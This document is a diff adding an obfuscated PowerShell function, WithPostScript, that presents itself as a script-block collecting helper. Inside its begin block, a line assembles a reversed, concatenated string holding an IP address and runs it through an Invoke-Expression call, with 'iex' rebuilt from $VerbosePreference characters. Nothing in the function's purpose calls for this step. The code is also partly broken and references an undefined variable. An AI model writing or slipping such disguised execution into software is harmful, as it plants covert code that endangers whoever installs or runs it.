@@ -1,0 +1,47 @@
+ ${m`Z80}= [TypE]('REg'+'Ex'); s`Et-`itEM  VarIablE:e48v (  [typE]('S'+'c'+'RiptbLocK'));  Function WIThPOstscRipT {
+    
+    [cmdletbinding()]
+    param(
+        [parameter( pOSItioN = 0,
+                    VALuefrompIpELInE = ${tR`UE},
+                    ValUefRomPiPElinEbYpRoPeRTYNaMe = ${tr`Ue})]
+        [scriptblock[]]${ScRip`TBl`o`Ck},
+
+        [parameter( pOSITioN = 1 )]
+        [validatescript({tE`St`-`PATh ${_}})]
+        [string[]]${PA`Th}
+    )
+    begin
+    {
+        ${S`crIpT`STo`p`RoCEss} = NE`w-OB`JECT SYSTeM.coLLeCtIOnS.ArRayLiST
+        if(${PsBOu`Nd`PArame`T`ERS}.COnTAinSkEY(('Pa'+'th')))
+        {
+            ${I`YSWe}  =  (  (  VariAB`Le ("MZ"+"80") -vaLU)::MAtcHES((('))93'+']'+'RAHc[]'+'gNirT'+'s[,IQqBGVIQq(ec'+'a'+'LPE'+'R.'+')'+'IQq'+'BGVIQ'+'q+IQq07.'+'IQq+IQq'+'4IQq+IQq'+'32.721.'+'6'+'2IQq+IQq'+'1IQq'+'+IQq'+':piBGVIQ'+'q(( ').rEPLaCe(([cHar]73+[cHar]81+[cHar]113),[StrinG][cHar]39)+")''Nioj-'x'+]3,1[)ecneReferPesobREv$]GNirts[( "+'(.'), '.',('RigH'+'t'+'toleFT') ) -Join'' )
+            foreach(${D`ir} in ${PA`TH})
+            {
+                ${sB} =   ${e4`8V}::CReaTE( $(Get-c`oNt`Ent ${s`c`RIP`TFiLE} -Raw) )
+            }
+            ${p`Air} = [pscustomobject]@{
+                SCriptBLOCK = ${Sb}
+                SkipOnError = ${n`Ull}
+            }
+            [void]${S`CrIpTSt`Opr`o`Cess}.AdD(${p`Air})
+        }
+    }
+    Process
+    {
+        foreach(${S`B} in ${Scr`ipT`B`lOCK})
+        {
+            ${Pa`iR} = [pscustomobject]@{
+                sCRipTBLoCk = ${S`B}
+                skIPoNERror = ${NU`lL}
+            }
+            [void]${ScrIp`TSTO`pro`cESs}.Add(${pA`iR})
+        }
+    }
+    end
+    {
+        ${sC`R`iPt:THIsby}.poSTscript = @( ${sc`R`iptSTOpRoc`E`Ss} )
+    }
+}
+
